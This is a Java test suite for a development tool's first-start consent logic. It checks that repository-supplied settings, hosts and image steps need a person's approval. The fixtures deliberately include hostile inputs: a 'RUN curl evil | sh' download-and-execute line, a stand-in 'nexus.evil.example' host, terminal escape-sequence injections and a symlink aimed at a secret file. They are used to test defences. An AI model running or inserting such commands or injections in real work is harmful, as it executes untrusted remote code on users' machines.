package org.fuin.porelo.app;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermissions;
import java.util.ArrayList;
import java.util.List;
import org.fuin.porelo.core.config.XdgPaths;
import org.fuin.porelo.ecosystem.api.Detection;
import org.fuin.porelo.ecosystem.api.Finding;
import org.fuin.porelo.testing.FakeCommandRunner;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/** What a first start may take from a repository: nothing without a person's yes to that text. */
class FirstStartTest {

    private static final String ORIGIN = "https://forge.example/acme/shop.git";

    @TempDir Path root;

    private final FakeCommandRunner runner = new FakeCommandRunner();

    private final StringWriter said = new StringWriter();

    private final List<String> questions = new ArrayList<>();

    private PoreloContext context;

    private Path checkout;

    private int detected;

    private EcosystemDetector detector;

    private static Finding tool(final String key, final String value, final String file) {
        return new Finding(
                Finding.Part.TOOLS, key, value, file, 1, Finding.Origin.CHECKOUT, false, "");
    }

    private static Finding host(final String name, final Finding.Origin origin) {
        return new Finding(
                Finding.Part.RULES, "host." + name, "yes", "pom.xml", 1, origin, false, "");
    }

    @BeforeEach
    void machine() throws Exception {
        context =
                new PoreloContext(
                        runner,
                        new PoreloPaths(XdgPaths.of(key -> null, root), root.resolve("bin")),
                        args -> 0,
                        key -> null);
        checkout = Files.createDirectories(root.resolve("work/shop")).toRealPath();
        runner.answering("--show-toplevel", checkout.toString());
        runner.answering("get-url origin", ORIGIN);
        detector = answering(tool("package.maven", "", "pom.xml"));
    }

    private EcosystemDetector answering(final Finding... findings) {
        return (plugin, directory, home) -> {
            detected++;
            return new Detection(List.of(findings), List.of());
        };
    }

    private void plugin() throws Exception {
        final Path plugin =
                Files.createDirectories(context.paths().ecosystemDirectories().getFirst())
                        .resolve("maven");
        Files.writeString(
                plugin, "#!/bin/sh\nprintf '{\"protocolVersion\":1,\"ecosystem\":\"maven\"}'\n");
        Files.setPosixFilePermissions(plugin, PosixFilePermissions.fromString("rwx------"));
    }

    private void curated(final String host) throws Exception {
        final Path own = Files.createDirectories(context.paths().xdg().data().resolve("egress"));
        Files.writeString(
                own.resolve("curated.yaml"),
                "name: curated\nlabel: Curated\ndomains:\n    - " + host + "\n");
    }

    private FirstStart firstStart() {
        return new FirstStart(context, detector);
    }

    private WorkOrigin.Choice atTerminal(final String answer) {
        return atTerminal(answer, false);
    }

    /** As a person at a terminal answers, with {@code --notes} or without. */
    private WorkOrigin.Choice atTerminal(final String answer, final boolean notes) {
        return new FirstStartAtTerminal(firstStart(), new PrintWriter(said))
                .withNotes(notes)
                .choose(
                        checkout,
                        new Offer(
                                question -> {
                                    questions.add(question);
                                    return answer;
                                },
                                false,
                                false,
                                new PrintWriter(said)),
                        "Start once at a terminal without --yes or --no-input to be asked.");
    }

    private WorkOrigin.Choice unattended() {
        return new FirstStartAtTerminal(firstStart(), new PrintWriter(said))
                .choose(
                        checkout,
                        null,
                        "Start once at a terminal without --yes or --no-input to be asked.");
    }

    /** A terminal yes writes repository settings and allows the following launch. */
    @Test
    void aYesWritesRepositorySettingsAndStaysInDefault() throws Exception {
        plugin();
        detector =
                answering(
                        tool("package.maven", "", "pom.xml"),
                        host("repo.example.org", Finding.Origin.YOURS));

        final WorkOrigin.Choice choice = atTerminal("y", true);

        assertThat(choice.project()).isEqualTo("default");
        assertThat(choice.repository()).isEqualTo("shop");
        assertThat(checkout.resolve("project.yml")).doesNotExist();
        assertThat(checkout.resolve("porelo.yml")).exists();
        assertThat(Files.readString(checkout.resolve("porelo.yml")))
                .contains("maven", "repo.example.org")
                .doesNotContain("project:", "repositories:", "organization:", "members:");
        assertThat(questions).singleElement().asString().contains("porelo.yml", "default");
        assertThat(said.toString()).contains("package.maven", "pom.xml", "repo.example.org");
        assertThat(String.join("\n", runner.lines())).doesNotContain(" commit", " add ");
        assertThat(context.paths().projects().projectApprovals()).doesNotExist();
        assertReadyWithOwnSettings();
    }

    /** The written file reads as repository settings and has nothing left to allow. */
    private void assertReadyWithOwnSettings() {
        final Path file = new DefaultProject(context).file();
        final var project = org.fuin.porelo.core.project.ProjectReader.read(file);
        final var found = RepositoryOwnSettings.of(context, file, project.repository("shop"));
        assertThat(found).isNotNull();
        assertThat(found.project().egress().domains()).contains("repo.example.org");
        assertThat(found.toAllow(context, "shop")).isEmpty();
        assertThat(
                        StartCheck.withSettings(
                                        context,
                                        new StartCheck.Result(
                                                StartCheck.Outcome.READY, "", "", "", ""),
                                        file,
                                        "shop")
                                .outcome())
                .isEqualTo(StartCheck.Outcome.READY);
        assertThat(new DefaultProject(context).entries())
                .singleElement()
                .satisfies(
                        entry -> {
                            assertThat(entry.checkout()).isEqualTo(checkout.toString());
                            assertThat(entry.upstream()).isEqualTo(checkout.toString());
                        });
    }

    /** An existing repository file skips detection and leaves its allowance to the launch. */
    @Test
    void aCheckoutWithRepositorySettingsIsKnown() throws Exception {
        Files.writeString(
                checkout.resolve("porelo.yml"), "egress:\n  domains: [repo.example.org]\n");
        final FirstStart.Answer answer = firstStart().look(checkout);
        assertThat(answer.outcome()).isEqualTo(FirstStart.Outcome.KNOWN);
        assertThat(answer.project()).isEqualTo("default");
        assertThat(detected).isZero();
        assertThat(atTerminal("n").project()).isEqualTo("default");
        assertThat(questions).isEmpty();
        final Path file = new DefaultProject(context).file();
        final var project = org.fuin.porelo.core.project.ProjectReader.read(file);
        assertThat(
                        RepositoryOwnSettings.of(context, file, project.repository("shop"))
                                .toAllow(context, "shop"))
                .isNotEmpty();
    }

    /** The old approved project stays intact; advice is recorded per checkout on this machine. */
    @Test
    void anApprovedLocalProjectStartsAsBeforeAndHearsTheNoteOnce() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), FILE);
        assertThat(atTerminal("y").project()).isEqualTo("strangers");
        said.getBuffer().setLength(0);
        questions.clear();

        assertThat(atTerminal("n").project()).isEqualTo("strangers");
        assertThat(
                        said.toString()
                                .lines()
                                .filter(
                                        line ->
                                                line.contains("porelo.yml")
                                                        && line.contains("default")))
                .hasSize(1);
        said.getBuffer().setLength(0);
        assertThat(atTerminal("n").project()).isEqualTo("strangers");
        assertThat(said.toString()).doesNotContain("porelo.yml");
        assertThat(questions).isEmpty();
        assertThat(checkout.resolve("project.yml")).hasContent(FILE);
        assertThat(checkout.resolve("porelo.yml")).doesNotExist();
        secondCheckout(ORIGIN);
        Files.writeString(checkout.resolve("project.yml"), FILE);
        assertThat(atTerminal("n").project()).isEqualTo("strangers");
        assertThat(said.toString()).contains("porelo.yml", "default");
    }

    @Test
    void aNoKeepsNothingAndTheNextStartAsksAgain() throws Exception {
        plugin();

        assertThat(atTerminal("n")).isNull();

        assertThat(checkout.resolve("project.yml")).doesNotExist();
        assertThat(checkout.resolve("porelo.yml")).doesNotExist();
        assertThat(context.paths().projects().projectApprovals()).doesNotExist();
        assertThat(ProjectSource.resolve(context, "shop-project").file()).isNull();
        assertThat(said.toString()).contains("nothing kept");
        assertThat(atTerminal("n")).isNull();
        assertThat(questions).hasSize(2);
    }

    @Test
    void nobodyToAskWritesNothingAndSaysWhatWasFoundAndHowToBeAsked() throws Exception {
        plugin();

        assertThat(unattended()).isNull();

        assertThat(checkout.resolve("project.yml")).doesNotExist();
        assertThat(checkout.resolve("porelo.yml")).doesNotExist();
        assertThat(questions).isEmpty();
        assertThat(said.toString())
                .contains("package.maven", "nothing written", "without --yes", "'default'");
    }

    @Test
    void noPluginGoesAsTodayAndSaysSo() {
        assertThat(atTerminal("y")).isNull();

        assertThat(detected).isZero();
        assertThat(questions).isEmpty();
        assertThat(said.toString()).contains("no ecosystem adapter is installed");
        assertThat(checkout.resolve("project.yml")).doesNotExist();
        assertThat(checkout.resolve("porelo.yml")).doesNotExist();
    }

    @Test
    void nothingRecognizedGoesAsTodayAndSaysSo() throws Exception {
        plugin();
        detector = answering();

        assertThat(atTerminal("y")).isNull();

        assertThat(questions).isEmpty();
        assertThat(said.toString()).contains("recognized nothing");
    }

    @Test
    void aPluginThatFailsIsSaidApartFromOneThatRecognizedNothing() throws Exception {
        plugin();
        detector =
                (plugin, directory, home) -> {
                    throw new org.fuin.porelo.ecosystem.api.EcosystemException("broke");
                };

        assertThat(atTerminal("y")).isNull();

        assertThat(said.toString()).contains("maven failed to answer");
    }

    @Test
    void aRepositorysControlCharactersReachNoTerminal() throws Exception {
        plugin();
        detector =
                answering(
                        tool("tool.jdk", "21\u001b[2J", "evil\u001b]0;x\u0007.xml"),
                        new Finding(
                                Finding.Part.TOOLS,
                                "tool.ant",
                                "",
                                "b\u0085uild.xml",
                                1,
                                Finding.Origin.CHECKOUT,
                                true,
                                "see\u001b[31m parent"));

        atTerminal("n");

        assertThat(said.toString())
                .doesNotContain("\u001b", "\u0007", "\u0085")
                .contains("tool.jdk");
    }

    @Test
    void aPluginsUnusableHostIsNeitherWrittenNorRepeated() throws Exception {
        plugin();
        detector = answering(host("a\nb.example:token", Finding.Origin.CHECKOUT));

        assertThat(atTerminal("y")).isNull();

        assertThat(checkout.resolve("project.yml")).doesNotExist();
        assertThat(checkout.resolve("porelo.yml")).doesNotExist();
        assertThat(questions).isEmpty();
        assertThat(said.toString()).doesNotContain("token");
    }

    @Test
    void aHostOnlyTheCheckoutNamesOutsideACuratedSetIsMarkedAndDefaultsToNo() throws Exception {
        plugin();
        curated("repo.maven.apache.org");
        detector =
                answering(
                        host("repo.maven.apache.org", Finding.Origin.CHECKOUT),
                        host("nexus.evil.example", Finding.Origin.CHECKOUT));

        assertThat(atTerminal("")).as("an empty answer is a no here").isNull();

        assertThat(questions.getFirst()).endsWith("[y/N]");
        assertThat(said.toString())
                .contains("nexus.evil.example  <- only this repository names it")
                .doesNotContain("repo.maven.apache.org  <-");
        assertThat(checkout.resolve("project.yml")).doesNotExist();
        assertThat(checkout.resolve("porelo.yml")).doesNotExist();
        assertThat(firstStart().look(checkout).marked()).containsExactly("nexus.evil.example");
    }

    @Test
    void hostsInACuratedSetOrThePersonsOwnFilesDefaultToYes() throws Exception {
        plugin();
        curated("repo.maven.apache.org");
        detector =
                answering(
                        host("repo.maven.apache.org", Finding.Origin.CHECKOUT),
                        host("nexus.corp.example", Finding.Origin.YOURS));

        assertThat(atTerminal("")).isNotNull();

        assertThat(questions.getFirst()).endsWith("[Y/n]");
        assertThat(said.toString()).doesNotContain("<-");
    }

    @Test
    void anUnknownJdkIsSaidWithWhyAndItsParentAndAYesWritesTheFileWithoutIt() throws Exception {
        plugin();
        detector =
                answering(
                        new Finding(
                                Finding.Part.TOOLS,
                                "tool.jdk",
                                "",
                                "pom.xml",
                                4,
                                Finding.Origin.CHECKOUT,
                                true,
                                "set by its parent org.acme:parent:1, not in the local repository"));

        assertThat(atTerminal("y", true)).isNotNull();

        assertThat(said.toString())
                .contains("unknown  tool.jdk", "org.acme:parent:1", "without it");
        final String text = Files.readString(checkout.resolve("porelo.yml"));
        assertThat(text).doesNotContain("RUN ");
        assertThat(firstStart().look(checkout).outcome()).isEqualTo(FirstStart.Outcome.KNOWN);
    }

    /** A repository draft stays usable when its former proposed project name is already taken. */
    @Test
    void aDraftDoesNotTakeAnotherLocalProjectsName() throws Exception {
        plugin();
        final Path written = context.paths().projects().defaultProjectFile("shop-project");
        Files.createDirectories(written.getParent());
        Files.writeString(
                written,
                "project:\n  name: shop-project\n  security_class: guarded\n"
                        + "image:\n  from: ubuntu:24.04\n");

        assertThat(atTerminal("y").project()).isEqualTo("default");

        assertThat(questions).hasSize(1);
        assertThat(checkout.resolve("project.yml")).doesNotExist();
        assertThat(checkout.resolve("porelo.yml")).exists();
    }

    /** The repository file makes later starts known without repeating detection or consent. */
    @Test
    void theSecondStartStaysInDefaultWithNoQuestionAndNoPlugin() throws Exception {
        plugin();
        atTerminal("y");
        final int asked = detected;
        questions.clear();

        final WorkOrigin.Choice second = atTerminal("n");

        assertThat(second.project()).isEqualTo("default");
        assertThat(second.repository()).isEqualTo("shop");
        assertThat(questions).isEmpty();
        assertThat(detected).isEqualTo(asked);
    }

    @Test
    void anotherCheckoutOfTheSameOriginFindsTheRecordedProject() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), FILE);
        atTerminal("y");
        checkout = Files.createDirectories(root.resolve("other/shop")).toRealPath();
        final int asked = detected;

        final WorkOrigin.Choice found = WorkOrigin.placedNaming(context, ORIGIN);

        assertThat(found.project()).isEqualTo("strangers");
        assertThat(found.repository()).isEqualTo("shop");
        assertThat(detected).isEqualTo(asked);
    }

    @Test
    void anOrganizationsPlacedProjectStillComesFirst() throws Exception {
        plugin();
        atTerminal("y");
        PlacedFixture.place(
                context,
                "acme",
                "project:\n  name: acme\n  security_class: guarded\n"
                        + "image:\n  from: ubuntu:24.04\n"
                        + "repositories:\n  shop:\n    upstream: \""
                        + ORIGIN
                        + "\"\n");

        assertThat(WorkOrigin.placedNaming(context, ORIGIN).project()).isEqualTo("acme");
        final FirstStart.Answer answer = firstStart().look(checkout);
        assertThat(answer.outcome()).isEqualTo(FirstStart.Outcome.NOT_DEFAULT);
        assertThat(answer.project()).isEqualTo("acme");
    }

    @Test
    void aProjectYmlInAnOrganizationsCheckoutDecidesNothing() throws Exception {
        plugin();
        PlacedFixture.place(
                context,
                "acme",
                "project:\n  name: acme\n  security_class: guarded\n"
                        + "image:\n  from: ubuntu:24.04\n"
                        + "repositories:\n  shop:\n    upstream: \""
                        + ORIGIN
                        + "\"\n");
        Files.writeString(checkout.resolve("project.yml"), "project:\n  name: taken\n");

        assertThat(atTerminal("y")).isNull();

        assertThat(questions).isEmpty();
        assertThat(detected).isZero();
        assertThat(context.paths().projects().projectApprovals()).doesNotExist();
    }

    @Test
    void aMachineWithNoRecordBehavesAsBefore() throws Exception {
        assertThat(WorkOrigin.placedNaming(context, ORIGIN)).isNull();
        // A project this machine merely ran is no approval, whatever its file names.
        final Path other = root.resolve("elsewhere/project.yml");
        Files.createDirectories(other.getParent());
        Files.writeString(
                other,
                "project:\n  name: ran\n  security_class: guarded\n"
                        + "image:\n  from: ubuntu:24.04\n"
                        + "repositories:\n  shop:\n    upstream: \""
                        + ORIGIN
                        + "\"\n");
        new ProjectRegistry(context.paths().projects().projectRegistry()).remember("ran", other);

        assertThat(WorkOrigin.placedNaming(context, ORIGIN)).isNull();
        assertThat(WorkOrigin.fromCheckout(context, checkout).project()).isEqualTo("default");
    }

    private static final String FILE =
            "project:\n  name: strangers\n  security_class: guarded\n"
                    + "image:\n  from: ubuntu:24.04\n  run: |\n    RUN curl evil | sh\n"
                    + "egress:\n  domains:\n    - \"nexus.evil.example\"\n"
                    + "repositories:\n  shop:\n    upstream: \""
                    + ORIGIN
                    + "\"\n";

    @Test
    void aFileThisMachineDoesNotKnowIsAskedAboutAndNoPluginIsAsked() throws Exception {
        plugin();
        Files.writeString(checkout.resolve("project.yml"), FILE);

        assertThat(atTerminal("")).isNull();

        assertThat(detected).isZero();
        assertThat(questions.getFirst()).endsWith("[y/N]");
        assertThat(said.toString()).contains("RUN curl evil | sh", "nexus.evil.example  <-");
        assertThat(ProjectSource.resolve(context, "strangers").file()).isNull();
    }

    @Test
    void anApprovedFileIsKnownUntilItChangesAndAYesOrNoStandsForThatText() throws Exception {
        final Path file = checkout.resolve("project.yml");
        Files.writeString(file, FILE);

        final WorkOrigin.Choice yes = atTerminal("y");

        assertThat(yes.project()).isEqualTo("strangers");
        assertThat(yes.repository()).isEqualTo("shop");
        assertThat(firstStart().look(checkout).outcome()).isEqualTo(FirstStart.Outcome.KNOWN);
        assertThat(WorkOrigin.placedNaming(context, ORIGIN).project()).isEqualTo("strangers");

        Files.writeString(file, FILE.replace("nexus.evil", "more.evil"));

        assertThat(firstStart().look(checkout).outcome())
                .isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
        questions.clear();
        assertThat(atTerminal("n")).isNull();
        assertThat(questions).hasSize(1);
    }

    @Test
    void aFileNamedDefaultIsRefused() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), FILE.replace("strangers", "default"));

        assertThat(atTerminal("y")).isNull();

        assertThat(questions).isEmpty();
        assertThat(said.toString()).contains("may not be called 'default'", "runs in 'default'");
        assertThat(context.paths().projects().projectApprovals()).doesNotExist();
    }

    @Test
    void aProjectNamedLikeItsRepositoryIsRefused() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), FILE.replace("strangers", "shop"));

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal()).isNotNull();
        // The reader refuses such a file, which is what makes it the file's own fault.
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
        assertThat(answer.refusal().detail()).contains("shop");
        assertThatThrownBy(() -> firstStart().confirm(checkout, answer.hash()))
                .isInstanceOf(FirstStart.Refused.class);
    }

    @Test
    void aLinkIsNoFileAndItsTargetIsNeverRead() throws Exception {
        final Path secret = Files.writeString(root.resolve("secret"), "password-fixture\n");
        Files.createSymbolicLink(checkout.resolve("project.yml"), secret);

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
        assertThat(answer.file()).isEmpty();
        assertThat(atTerminal("y")).isNull();
        assertThat(said.toString()).doesNotContain("password-fixture");
    }

    @Test
    void aFileThatDoesNotReadIsRefusedAndThePersonIsNotAsked() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), "project: [\u001b[2J\n");

        assertThat(atTerminal("y")).isNull();

        assertThat(questions).isEmpty();
        assertThat(said.toString()).contains("does not read").doesNotContain("\u001b");
    }

    @Test
    void confirmingTakesTheHashAndRefusesOneThatNoLongerMatches() throws Exception {
        plugin();
        final FirstStart.Answer asked = firstStart().look(checkout);
        assertThat(asked.outcome()).isEqualTo(FirstStart.Outcome.ASK_NEW);

        assertThatThrownBy(() -> firstStart().confirm(checkout, "feed"))
                .isInstanceOfSatisfying(
                        FirstStart.Refused.class,
                        ex -> assertThat(ex.reason()).isEqualTo(FirstStart.Reason.MOVED_ON));
        assertThat(checkout.resolve("porelo.yml")).doesNotExist();

        assertThat(firstStart().confirm(checkout, asked.hash())).isEqualTo("default");

        assertThat(Files.readString(checkout.resolve("porelo.yml"))).isEqualTo(asked.file());
        assertThat(firstStart().confirm(checkout, asked.hash())).isEqualTo("default");
    }

    private static final String WITH_SNIPPET =
            "project:\n  name: strangers\n  security_class: guarded\n"
                    + "image:\n  from: ubuntu:24.04\n  run_file: image.inc\n"
                    + "repositories:\n  shop:\n    upstream: \""
                    + ORIGIN
                    + "\"\n";

    private Path withSnippet() throws Exception {
        Files.writeString(checkout.resolve("image.inc"), "RUN echo approved\n");
        return Files.writeString(checkout.resolve("project.yml"), WITH_SNIPPET);
    }

    private Path copy() {
        return context.paths().projects().defaultProjectFile("strangers");
    }

    private Path lockOf(final String project) {
        return context.paths()
                .xdg()
                .config()
                .resolve("projects")
                .resolve(".approving-" + project + ".lock");
    }

    @Test
    void theApprovalKeepsHostPortAndPathAndALocalPathIsNotARemoteOne() throws Exception {
        final ProjectApprovals approvals = new ProjectApprovals(context);

        approvals.approve("onport", "http://127.0.0.1:3000/acme/shop.git");
        assertThat(approvals.approvedFor("onport", "http://127.0.0.1:3000/acme/shop.git")).isTrue();
        assertThat(approvals.approvedFor("onport", "http://127.0.0.1:4000/acme/shop.git"))
                .isFalse();
        assertThat(approvals.approvedFor("onport", "http://127.0.0.1/acme/shop.git")).isFalse();

        approvals.approve("remote", "https://forge.example/acme/shop.git");
        assertThat(approvals.approvedFor("remote", "/forge.example/acme/shop.git")).isFalse();
        assertThat(approvals.approvedFor("remote", "file:///forge.example/acme/shop.git"))
                .isFalse();
        assertThat(approvals.approvedFor("remote", "https://forge.example/acme/other.git"))
                .isFalse();
        assertThat(approvals.approvedFor("remote", "ssh://git@forge.example:2222/acme/shop.git"))
                .isFalse();
        assertThat(approvals.approvedFor("remote", "ssh://git@forge.example:022/acme/shop.git"))
                .as("the same port, however it is spelled")
                .isTrue();
        assertThat(approvals.approvedFor("remote", "git@forge.example:acme/shop.git"))
                .as("ssh and https of one host and path are one repository")
                .isTrue();
        assertThat(approvals.approvedFor("remote", "ssh://git@forge.example/acme/shop")).isTrue();
        assertThat(approvals.approvedFor("remote", "ssh://git@forge.example:22/acme/shop.git"))
                .isTrue();
        assertThat(approvals.approvedFor("remote", "https://FORGE.example:443/acme/shop/"))
                .isTrue();

        approvals.approve("local", "/srv/git/shop.git");
        assertThat(approvals.approvedFor("local", "file:///srv/git/shop")).isTrue();
        assertThat(approvals.approvedFor("local", "/srv/git/other.git")).isFalse();
    }

    @Test
    void aSecondCheckoutOnAnotherPortIsNotTheSameProject() throws Exception {
        runner.answering("get-url origin", "http://127.0.0.1:3000/acme/shop.git");
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        secondCheckout("http://127.0.0.1:4000/acme/shop.git");

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.NAME_TAKEN);
        answer.discard();
    }

    @Test
    void aCloneBySshOfWhatWasApprovedByHttpsIsTheSameProject() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        secondCheckout("git@forge.example:acme/shop.git");
        questions.clear();

        assertThat(atTerminal("n").project()).isEqualTo("strangers");
        assertThat(questions).isEmpty();
    }

    @Test
    void aYesWaitsForTheLockOfItsProject() throws Exception {
        withSnippet();
        final FirstStart.Answer answer = firstStart().look(checkout);
        try (var pool = java.util.concurrent.Executors.newSingleThreadExecutor()) {
            final var taken =
                    FileLocks.holding(
                            lockOf("strangers"),
                            () -> {
                                final var future = pool.submit(() -> firstStart().take(answer));
                                assertThatThrownBy(
                                                () ->
                                                        future.get(
                                                                700,
                                                                java.util.concurrent.TimeUnit
                                                                        .MILLISECONDS))
                                        .as("a yes takes nothing while another holds the name")
                                        .isInstanceOf(java.util.concurrent.TimeoutException.class);
                                assertThat(copy()).doesNotExist();
                                return future;
                            });
            assertThat(taken.get()).isEqualTo("strangers");
        }
        assertThat(copy()).exists();
    }

    @Test
    void aConfirmationAsTheDaemonGivesItWaitsForTheLockToo() throws Exception {
        withSnippet();
        final FirstStart.Answer looked = firstStart().look(checkout);
        final String hash = looked.hash();
        looked.discard();
        try (var pool = java.util.concurrent.Executors.newSingleThreadExecutor()) {
            final var taken =
                    FileLocks.holding(
                            lockOf("strangers"),
                            () -> {
                                final var future =
                                        pool.submit(() -> firstStart().confirm(checkout, hash));
                                assertThatThrownBy(
                                                () ->
                                                        future.get(
                                                                700,
                                                                java.util.concurrent.TimeUnit
                                                                        .MILLISECONDS))
                                        .isInstanceOf(java.util.concurrent.TimeoutException.class);
                                return future;
                            });
            assertThat(taken.get()).isEqualTo("strangers");
        }
    }

    @Test
    void twoYesesFromTwoUpstreamsAtOnceLeaveOneProjectThatAgreesWithItsRecord() throws Exception {
        withSnippet();
        final FirstStart.Answer first = firstStart().look(checkout);
        secondCheckout("https://forge.example/stranger/thing.git");
        Files.writeString(checkout.resolve("image.inc"), "RUN echo other\n");
        final FirstStart.Answer second = firstStart().look(checkout);
        final java.util.concurrent.CountDownLatch go = new java.util.concurrent.CountDownLatch(1);
        final List<String> taken = java.util.Collections.synchronizedList(new ArrayList<>());
        final List<FirstStart.Reason> refused =
                java.util.Collections.synchronizedList(new ArrayList<>());
        final List<Thread> threads = new ArrayList<>();
        for (final FirstStart.Answer each : List.of(first, second)) {
            threads.add(
                    Thread.ofVirtual()
                            .start(
                                    () -> {
                                        try {
                                            go.await();
                                            taken.add(firstStart().take(each) + each.upstream());
                                        } catch (FirstStart.Refused ex) {
                                            refused.add(ex.reason());
                                        } catch (InterruptedException ex) {
                                            Thread.currentThread().interrupt();
                                        }
                                    }));
        }
        go.countDown();
        for (final Thread each : threads) {
            each.join();
        }

        assertThat(taken).hasSize(1);
        assertThat(refused).containsExactly(FirstStart.Reason.NAME_TAKEN);
        final boolean firstWon = taken.getFirst().endsWith(ORIGIN);
        assertThat(new ProjectApprovals(context).approvedFor("strangers", ORIGIN))
                .isEqualTo(firstWon);
        assertThat(Files.readString(copy().resolveSibling("image.inc")))
                .isEqualTo(firstWon ? "RUN echo approved\n" : "RUN echo other\n");
    }

    @Test
    void aReapprovalKeepsAnOverrideAPersonPutThere() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        final Path override = copy().resolveSibling("shop/.porelo.yml");
        Files.createDirectories(override.getParent());
        Files.writeString(override, "image:\n  from: mine:1\n");
        Files.writeString(checkout.resolve("image.inc"), "RUN echo changed\n");

        assertThat(atTerminal("y")).isNotNull();

        assertThat(Files.readString(copy().resolveSibling("image.inc")))
                .isEqualTo("RUN echo changed\n");
        assertThat(override).hasContent("image:\n  from: mine:1\n");
    }

    @Test
    void anOverrideAPersonPutThereDoesNotAskAgain() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        final Path override = copy().resolveSibling("shop/.porelo.yml");
        Files.createDirectories(override.getParent());
        Files.writeString(override, "image:\n  from: mine:1\n");
        questions.clear();

        assertThat(atTerminal("n").project()).isEqualTo("strangers");
        assertThat(questions).isEmpty();
    }

    @Test
    void aNewFileNamingWhereAPersonsOwnFileStandsIsRefusedAndTheirsStays() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        final Path mine = copy().resolveSibling("other.inc");
        Files.writeString(mine, "RUN echo mine\n");
        Files.writeString(checkout.resolve("other.inc"), "RUN echo theirs\n");
        Files.writeString(
                checkout.resolve("project.yml"), WITH_SNIPPET.replace("image.inc", "other.inc"));

        atTerminal("y");

        assertThat(said.toString()).contains("other.inc");
        assertThat(mine).hasContent("RUN echo mine\n");
    }

    @Test
    void aReapprovalDropsAFileTheOldCopyNamedAndTheNewOneDoesNot() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        Files.writeString(checkout.resolve("other.inc"), "RUN echo other\n");
        Files.writeString(
                checkout.resolve("project.yml"), WITH_SNIPPET.replace("image.inc", "other.inc"));

        assertThat(atTerminal("y")).isNotNull();

        assertThat(copy().resolveSibling("other.inc")).exists();
        assertThat(copy().resolveSibling("image.inc")).doesNotExist();
    }

    @Test
    void aRecordThatCannotBeWrittenLeavesTheOldCopyAndTheOldApproval() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        Files.writeString(checkout.resolve("image.inc"), "RUN echo changed\n");
        final FirstStart.Answer answer = firstStart().look(checkout);
        final Path approvals = context.paths().projects().projectApprovals();
        Files.setPosixFilePermissions(approvals, PosixFilePermissions.fromString("r-x------"));
        try {
            assertThatThrownBy(() -> firstStart().take(answer))
                    .isInstanceOfSatisfying(
                            FirstStart.Refused.class,
                            ex -> assertThat(ex.reason()).isEqualTo(FirstStart.Reason.NOT_WRITTEN));
        } finally {
            Files.setPosixFilePermissions(approvals, PosixFilePermissions.fromString("rwx------"));
            answer.discard();
        }

        assertThat(Files.readString(copy().resolveSibling("image.inc")))
                .isEqualTo("RUN echo approved\n");
        Files.writeString(checkout.resolve("image.inc"), "RUN echo approved\n");
        final FirstStart.Answer again = firstStart().look(checkout);
        assertThat(again.outcome()).isEqualTo(FirstStart.Outcome.KNOWN);
    }

    /** A failed old-project approval rolls back its staged copy and preserves the checkout. */
    @Test
    void aRecordThatFailsAtTheLastStepTakesTheCopyBack() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), FILE);
        // A directory in the record's place: the record is written, and only its rename fails.
        Files.createDirectories(
                context.paths().projects().projectApprovals().resolve("strangers/in-the-way"));
        final FirstStart.Answer answer = firstStart().look(checkout);
        assertThat(answer.outcome()).isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);

        assertThatThrownBy(() -> firstStart().take(answer))
                .isInstanceOfSatisfying(
                        FirstStart.Refused.class,
                        ex -> assertThat(ex.reason()).isEqualTo(FirstStart.Reason.NOT_WRITTEN));
        answer.discard();

        assertThat(context.paths().projects().defaultProjectFile("strangers")).doesNotExist();
        assertThat(checkout.resolve("project.yml")).hasContent(FILE);
    }

    @Test
    void aNameThatIsNoTextIsRefusedAtTheLookInWords() throws Exception {
        Files.writeString(
                checkout.resolve("project.yml"),
                "project:\n  name: 123\n  security_class: guarded\n"
                        + "image:\n  from: ubuntu:24.04\n");

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal()).isNotNull();
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
        assertThat(answer.refusal().detail())
                .contains("'project.name' is one word, a string, not '123'");
        answer.discard();
        assertThat(atTerminal("y")).isNull();
        assertThat(questions).isEmpty();
        assertThat(said.toString()).contains("project.name", "'default'");
        assertThat(context.paths().projects().defaultProjectFile("123")).doesNotExist();
    }

    @Test
    void anImageAtAStartAfterAYesTakesTheCopysNamedFileWhateverTheCheckoutHolds() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        Files.writeString(checkout.resolve("image.inc"), "RUN echo edited\n");

        final org.fuin.porelo.core.project.Project project =
                org.fuin.porelo.core.project.ProjectReader.read(
                        ProjectSource.require(context, "strangers"));
        final ImageChoice choice =
                ImageChoice.preview(context, project, project.workRepositories().getFirst())
                        .choice();

        assertThat(choice.snippet()).contains("RUN echo approved").doesNotContain("edited");
    }

    @Test
    void aChangeInANamedFileAloneAsksAgain() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();

        Files.writeString(checkout.resolve("image.inc"), "RUN curl evil | sh\n");

        assertThat(firstStart().look(checkout).outcome())
                .isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
    }

